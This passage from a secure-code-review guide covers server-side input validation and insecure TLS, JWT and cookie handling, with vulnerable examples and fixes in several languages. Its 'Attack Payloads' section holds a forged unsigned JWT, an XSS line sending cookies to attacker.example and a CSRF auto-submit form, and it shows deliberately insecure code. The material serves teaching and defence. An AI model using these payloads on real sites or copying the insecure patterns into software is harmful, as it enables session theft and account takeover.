-- Batch job trusts JSON column written by API with client-only validation
INSERT INTO orders SELECT * FROM json_populate_record(NULL::orders, client_json);
```

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/gift-cards/redeem")
public ResponseEntity<?> redeem(@RequestBody RedeemRequest req) {
    // Front-end enforces amount > 0 and PIN format; server skips validation
    giftCardService.redeem(req.getPin(), req.getAmount(), req.getBonus());
    return ResponseEntity.ok().build();
}

@PostMapping("/subscriptions/upgrade")
public String upgrade(@RequestParam String tier, @RequestParam int months) {
    subscriptionService.upgrade(currentUser(), tier, months); // no server-side tier policy
    return "redirect:/account";
}
```

### C#

```csharp
[HttpPost("gift-cards/redeem")]
public IActionResult RedeemGiftCard(RedeemDto dto)
{
    // Blazor form validates PIN format; API endpoint accepts raw dto
    _service.Redeem(UserId, dto);
    return Ok();
}

public class RedeemDto
{
    public string Pin { get; set; }
    public decimal Amount { get; set; } // no [Range], [Required], or length limits
}
```

### JavaScript

```javascript
function validateRedeem() {
  const amount = Number(document.querySelector('[name="amount"]').value);
  if (amount < 5 || amount > 500) return false;
  return true; // bypass with curl; server must re-validate
}

document.getElementById("redeem").addEventListener("submit", (e) => {
  if (!validateRedeem()) e.preventDefault();
  // hidden bonus/tier fields sent without server-side recomputation
});
```

### HTML

```html
<form action="/gift-cards/redeem" method="post">
  <input type="number" name="amount" min="5" max="500" required>
  <input type="hidden" name="bonus" value="0">
  <input type="hidden" name="tier" value="standard">
  <!-- min/max/required are browser hints only; not enforced on server -->
</form>
```

## Fix: Safer Patterns and Libraries to Use

### Python

Validate at the API boundary with Pydantic. Recompute trusted fields server-side.

```python
from pydantic import BaseModel, Field, EmailStr, ConfigDict

class GiftCardRedeemRequest(BaseModel):
    model_config = ConfigDict(extra="forbid")
    amount: float = Field(ge=5, le=500)
    pin: str = Field(min_length=8, max_length=16)

@app.route("/gift-cards/redeem", methods=["POST"])
def redeem_gift_card():
    req = GiftCardRedeemRequest.model_validate(request.get_json())
    credit = gift_cards.redeem(req.pin, req.amount)  # server-computed, not from client bonus field
    redemption = GiftRedemption(user_id=session["user_id"], credit=credit)
    db.session.add(redemption)
    db.session.commit()
    return jsonify({"credit": credit})
```

**Important:** Client-side validation is UX only. Every security-relevant rule must exist on the server.

```python
# Marshmallow alternative:
from marshmallow import Schema, fields, validate

class RedeemSchema(Schema):
    amount = fields.Decimal(required=True, validate=validate.Range(min=5, max=500))
    pin = fields.Str(required=True, validate=validate.Length(min=8, max=16))
```

### Java

Apply Jakarta Bean Validation on request DTOs. Reject invalid input before the service layer.

```java
public record GiftCardRedeemRequest(
    @NotBlank @Pattern(regexp = "^[A-Z0-9]{8,16}$") String pin,
    @NotNull @DecimalMin("5.00") @DecimalMax("500.00") BigDecimal amount
) {}

@PostMapping("/gift-cards/redeem")
public ResponseEntity<?> redeem(@Valid @RequestBody GiftCardRedeemRequest req) {
    giftCardService.redeem(req.pin(), req.amount());
    return ResponseEntity.ok().build();
}
```

**Important:** Use `@Valid` on every mutating controller parameter. Recompute price, role, and owner from server context.

### C#

Use DataAnnotations or FluentValidation. Check ModelState on every mutating action.

```csharp
public class RedeemDto
{
    [Required, RegularExpression("^[A-Z0-9]{8,16}$")]
    public string Pin { get; set; } = "";

    [Required, Range(5, 500)]
    public decimal Amount { get; set; }
}

[HttpPost("gift-cards/redeem")]
public IActionResult RedeemGiftCard([FromBody] RedeemDto dto)
{
    if (!ModelState.IsValid)
        return BadRequest(ModelState);
    _service.Redeem(UserId, dto);
    return Ok();
}
```

**Important:** Never trust disabled UI fields. Authorization-sensitive properties come from server claims, not the request body.

### Go

Validate struct tags after JSON decode. Reject unknown fields.

```go
import "github.com/go-playground/validator/v10"

type RedeemGiftCardRequest struct {
    Amount float64 `json:"amount" validate:"required,gte=5,lte=500"`
    Pin    string  `json:"pin" validate:"required,min=8,max=16"`
}

func redeemGiftCard(w http.ResponseWriter, r *http.Request) {
    var req RedeemGiftCardRequest
    dec := json.NewDecoder(r.Body)
    dec.DisallowUnknownFields()
    if err := dec.Decode(&req); err != nil {
        http.Error(w, "invalid json", http.StatusBadRequest)
        return
    }
    if err := validate.Struct(req); err != nil {
        http.Error(w, "validation failed", http.StatusBadRequest)
        return
    }
    credit := giftcards.Redeem(req.Pin, req.Amount)
    db.Exec("INSERT INTO redemptions (user_id, credit) VALUES ($1,$2)", userID(r), credit)
}
```

**Important:** Shared validation middleware beats ad hoc checks scattered across handlers.

## Insecure coding practice {: #insecure-practice }

From former `4-42-review-insecure-coding-practice.md`. **Guiding chapter section:** [4.9 - Review Secrets, Defaults, and Dangerous APIs § Insecure coding practice](../../4-09-review-secrets-defaults-and-dangerous-apis.md#insecure-practice).

# 4.42 Code Reference — Review Insecure Coding Practice

## Attack Payloads

Use these in authorized tests against TLS clients, JWT validators, and cookie-based sessions.

### Pattern 1: Forged JWT (no signature verification)

```json
{"alg":"none"}
{"sub":"admin","role":"superuser","exp":9999999999}
```

```text
# Base64url header.payload.  (trailing dot, empty signature)
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### Pattern 2: HS256 with weak / public secret

```text
# Attacker brute-forces "changeme" or reads secret from git
# Re-signs token with elevated claims
{"sub":"victim","role":"admin"}
```

### Pattern 3: Algorithm confusion (RS256 → HS256)

```text
# Use RS256 public key as HMAC secret when server accepts both
{"alg":"HS256","typ":"JWT"}
```

See [4.17 Review JWT Security](../../4-05-review-authentication-session-and-access.md#jwt) for full algorithm-confusion patterns.

### Pattern 4: MITM with verification disabled

```text
# Attacker on network path presents self-signed cert
# Client with verify=False accepts and reads/modifies OAuth tokens, API keys
```

### Pattern 5: Session cookie theft via missing flags

```javascript
// XSS payload when HttpOnly is false:
document.cookie
fetch('https://attacker.example/?c=' + document.cookie)
```

### Pattern 6: Cross-site cookie send (missing SameSite)

```html
<!-- Victim visits attacker page; browser sends session cookie on cross-site POST -->
<form action="https://app.example/transfer" method="POST">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

## Language-Specific Sinks and Dangerous APIs

### Python

```python
requests.get(url, verify=False)
httpx.Client(verify=False)
from jose import jwt as jose_jwt
jose_jwt.get_unverified_claims(token)  # used for auth without signature check
response.set_cookie("auth_token", sid, httponly=False, secure=False)
urllib3.disable_warnings()  # often paired with verify=False
```

Also review: `aiohttp` connector with `ssl=False`, `paramiko` AutoAddPolicy, `smtp` without TLS.

### Java

```java
conn.setSSLSocketFactory(trustAllFactory);
conn.setHostnameVerifier((h, s) -> true);
HttpClients.custom().setSSLContext(trustAll).build();
Jwts.parser().setSigningKey("secret").parseClaimsJws(jwt);  // no iss/aud
new JwtParserBuilder().setAllowedClockSkewSeconds(Integer.MAX_VALUE);
Cookie c = new Cookie("JSESSIONID", id);  // no HttpOnly/Secure
```

Spring: `spring.security.oauth2.resourceserver.jwt` misconfiguration; custom filters that only base64-decode JWT payload.

### C#

```csharp
handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
ServicePointManager.ServerCertificateValidationCallback += (_, _, _, _) => true;
new JwtSecurityTokenHandler().ReadJwtToken(jwt);  // no validation
TokenValidationParameters { ValidateIssuer = false, ValidateAudience = false };
Response.Cookies.Append("Session", id, new CookieOptions { HttpOnly = false });
```

### JavaScript

```javascript
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
axios.get(url, { httpsAgent: new https.Agent({ rejectUnauthorized: false }) });
jwt.decode(token);  // jsonwebtoken — no verify
res.cookie('session', sid);  // express — default flags
fetch(url, { agent: new https.Agent({ rejectUnauthorized: false }) });
```

### Go

```go
tls.Config{InsecureSkipVerify: true}
jwt.ParseUnverified(tokenString, jwt.MapClaims{})
http.SetCookie(w, &http.Cookie{Name: "session", Value: sid})  // no HttpOnly
grpc.WithTransportCredentials(insecure.NewCredentials())
```

## Vulnerable Examples in Other Languages

### Java

```java
// OkHttp client with permissive hostname verifier on user-supplied URL
OkHttpClient client = new OkHttpClient.Builder()
    .hostnameVerifier((hostname, session) -> true)
    .build();
Request req = new Request.Builder().url(userSuppliedUrl)
    .header("Authorization", "Bearer hardcoded-partner-token")
    .build();

// JWT: parser accepts HS256 with static secret only — no aud/iss
Claims claims = Jwts.parserBuilder()
    .setSigningKey("changeme".getBytes(StandardCharsets.UTF_8))
    .build()
    .parseClaimsJws(jwt).getBody();

// Servlet cookie without HttpOnly, Secure, or SameSite
Cookie c = new Cookie("JSESSIONID", session.getId());
response.addCookie(c);
```

### C#

```csharp
// HttpClient handler that accepts any server certificate
var handler = new HttpClientHandler {
    ServerCertificateCustomValidationCallback = (_, _, _, _) => true
};
var client = new HttpClient(handler);
var data = await client.GetStringAsync(userUrl);

// JWT without full validation
var token = new JwtSecurityTokenHandler().ReadJwtToken(jwt);
var role = token.Claims.First(c => c.Type == "role").Value;

// Cookie missing flags
Response.Cookies.Append("Session", sessionId, new CookieOptions {
    HttpOnly = false,
    Secure = false
});
```

### Go

```go
// Insecure TLS skip (testing helper left in prod)
tr := &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}
resp, _ := http.Client{Transport: tr}.Get(partnerURL)

// JWT parsed without verifying signature
token, _, _ := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{})
admin, _ := token.Claims.(jwt.MapClaims)["admin"].(bool)

// Cookie without HttpOnly / Secure / SameSite
http.SetCookie(w, &http.Cookie{Name: "session", Value: sid, Path: "/"})
```

## Fix: Safer Patterns and Libraries to Use

### Python

**TLS: always verify server certificates.** Use default verification in httpx or requests; pin corporate roots via `verify=` path or system trust store—not `verify=False`.

```python
import httpx

async def fetch_export(base_url: str, ca_bundle: str | None = None) -> bytes:
    verify: str | bool = ca_bundle if ca_bundle else True
    async with httpx.AsyncClient(verify=verify, timeout=10.0) as client:
        resp = await client.get(f"{base_url.rstrip('/')}/v1/export")
        resp.raise_for_status()
        return resp.content
```

**Important:** Never set `verify=False` except in isolated tests. If tests need it, gate with an explicit non-production flag that fails closed in CI for release artifacts.

**JWT: verify signature, algorithm, and claims.**

```python
import jwt

def current_user(token: str) -> dict:
    return jwt.decode(
        token,
        key=get_signing_key(),  # from env / JWKS — not a hardcoded demo secret
        algorithms=["RS256"],   # explicit allowlist — never accept "none"
        audience="my-api",
        issuer="https://idp.example/",
        options={"require": ["exp", "sub"]},
    )
```

**Cookies: set HttpOnly, Secure, and SameSite.**

```python
response.set_cookie(
    "sid",
    session_id,
    httponly=True,
    secure=True,
    samesite="lax",
    max_age=900,
)
```

### Java

```java
// Use default SSL socket factory — do not install trust-all managers
HttpsURLConnection conn = (HttpsURLConnection) new URL(allowlistedUrl).openConnection();

// JWT with explicit key and algorithm (jjwt example)
Jwts.parserBuilder()
    .setSigningKeyResolver(jwkResolver)
    .requireIssuer("https://idp.example/")
    .requireAudience("my-api")
    .build()
    .parseClaimsJws(jwt);

Cookie cookie = new Cookie("JSESSIONID", session.getId());
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setAttribute("SameSite", "Lax");
response.addCookie(cookie);
```

**Important:** `setSigningKey("secretkey")` without rotation, issuer, or audience checks is insufficient for production APIs.

### C#

```csharp
// Default HttpClient validates server certificates
using var client = new HttpClient();
var data = await client.GetStringAsync(allowlistedUrl);

var parameters = new TokenValidationParameters {
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = signingKey,
    ValidIssuer = "https://idp.example/",
    ValidAudience = "my-api",
    ValidateLifetime = true,
};
var principal = new JwtSecurityTokenHandler()
    .ValidateToken(jwt, parameters, out _);

Response.Cookies.Append("Session", sessionId, new CookieOptions {
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Lax,
    MaxAge = TimeSpan.FromMinutes(15),
});
```

### Go

```go
// Default client verifies TLS; use custom RootCAs for enterprise CAs only
client := &http.Client{Timeout: 10 * time.Second}
resp, err := client.Get(allowlistedURL)

token, err := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
    if t.Method.Alg() != "RS256" {
        return nil, fmt.Errorf("unexpected alg")
    }
    return publicKey, nil
}, jwt.WithAudience("my-api"), jwt.WithIssuer("https://idp.example/"))

http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sid,
    Path:     "/",
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode,
    MaxAge:   900,
})
```

